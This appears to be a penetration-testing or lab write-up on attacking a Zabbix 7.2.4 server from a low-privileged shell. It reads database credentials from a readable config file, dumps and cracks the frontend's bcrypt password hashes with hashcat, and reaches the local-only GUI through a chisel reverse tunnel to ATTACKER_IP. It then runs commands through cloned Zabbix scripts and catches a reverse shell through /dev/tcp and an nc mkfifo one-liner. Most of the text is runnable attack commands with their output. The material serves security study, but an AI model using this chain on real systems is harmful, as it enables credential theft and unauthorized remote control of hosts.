# Zabbix

Zabbix can expose useful local configuration and database credentials from a low-privileged shell. In the observed path, readable Zabbix web config led to the Zabbix database, cracked GUI credentials, local-only frontend access, and script execution as `zabbix`.

## Local Enumeration

Zabbix was running locally:

```text
127.0.0.1:10050  zabbix_agentd
127.0.0.1:10051  zabbix_server
```

Relevant processes:

```text
/usr/sbin/zabbix_agentd -c /etc/zabbix/zabbix_agentd.conf
/usr/sbin/zabbix_server -c /etc/zabbix/zabbix_server.conf
```

Useful config paths:

```text
/etc/zabbix/zabbix_agentd.conf
/etc/zabbix/zabbix_server.conf
/etc/zabbix/web/zabbix.conf.php
/usr/share/zabbix/ui/conf/maintenance.inc.php
```

The Zabbix web config was readable:

```bash
cat /etc/zabbix/web/zabbix.conf.php | grep -v "^#"
```

Useful database settings:

```php
$DB['TYPE']     = 'MYSQL';
$DB['SERVER']   = 'localhost';
$DB['PORT']     = '0';
$DB['DATABASE'] = 'zabbix';
$DB['USER']     = 'zabbix';
$DB['PASSWORD'] = 'password123';
```

Check the server and agent versions from the shell:

```bash
zabbix_server -V
zabbix_agentd -V
```

The output showed:

```text
zabbix_server (Zabbix) 7.2.4
zabbix_agentd (daemon) (Zabbix) 7.2.4
```

## Zabbix Database Credentials

Connect to MySQL and inspect Zabbix users:

```bash
mysql -u zabbix -h localhost -p
use zabbix;
select * from users\G
```

Observed users:

```text
username: Admin
passwd: $2y$10$KA6iPN5sY5.Z4KLerN7XOOO1P7jR8MD2e0SqNRXOsJjV1b.8c5Si.

username: guest
passwd: $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06
```

Crack the bcrypt hashes with Hashcat mode `3200`:

```bash
hashcat -a0 -m 3200 hashes /opt/rockyou.txt
```

Working Zabbix credential:

```text
Admin:password12345
```

## Access Local Zabbix GUI

The Zabbix frontend existed under the Apache site:

```text
http://mage.ai/zabbix/
Zabbix is under maintenance.
```

The maintenance config explained why browsing remotely showed maintenance mode and why localhost access was needed:

```bash
cat /usr/share/zabbix/ui/conf/maintenance.inc.php
```

```php
<?php
// Maintenance mode.
define('ZBX_DENY_GUI_ACCESS', 1);

// Array of IP addresses, which are allowed to connect to frontend (optional).
$ZBX_GUI_ACCESS_IP_RANGE = array('127.0.0.1');

// Message shown on warning screen (optional).
//$ZBX_GUI_ACCESS_MESSAGE = 'Zabbix is under maintenance.';
```

The frontend directory was present under `/usr/share/zabbix/`, and the writable config check showed:

```bash
find /usr/share/zabbix/ -writable 2>/dev/null
```

```text
/usr/share/zabbix/ui/conf/zabbix.conf.php
```

Use a reverse port forward to browse the local Zabbix GUI:

```bash
./chisel server --port 8080 --reverse
/tmp/chisel client ATTACKER_IP:8080 R:80:127.0.0.1:80 &
```

Browse locally:

```text
http://127.0.0.1/zabbix/
```

Login with:

```text
Admin:password12345
```

## Zabbix Script Execution

Use the Zabbix GUI to execute commands as `zabbix`:

```text
Alerts -> Scripts
Clone the default ping script
Change the command to: whoami
Monitoring -> Hosts
Click the host and run the cloned script
```

Successful command output:

```text
zabbix
```

Stage a reverse shell script readable by Zabbix:

```bash
cp /var/www/html/shell.sh /var/tmp/shell.sh
```

Edit the script to call back on the listener port:

```bash
cat /var/tmp/shell.sh
#!/bin/bash
sh -i >& /dev/tcp/ATTACKER_IP/8000 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 8000 >/tmp/f
```

Run it through a cloned Zabbix script and catch the shell:

```bash
nc -nlvp 8000
```

Successful shell:

```text
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
whoami
zabbix
```

